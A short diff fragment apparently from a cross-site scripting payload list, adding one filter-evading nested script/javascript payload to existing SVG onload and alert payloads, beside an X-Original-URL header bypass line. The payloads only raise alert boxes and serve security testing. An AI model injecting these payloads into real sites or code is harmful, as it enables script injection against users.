@@ -19,4 +19,5 @@ X-Original-URL: https:\\samcurry.net/please//work
 /><svg src=x onload=confirm(document.domain);>
 <script>alert(String.fromCharCode(88, 115, 115, 32, 66, 121, 32, 79, 108, 100, 77, 111, 104, 97, 109, 109))</script>
 <svg/onload=alert(document.domain)>")
+<<!<script>iframe src=javajavascriptscript:alert(document.domain)>
 ```
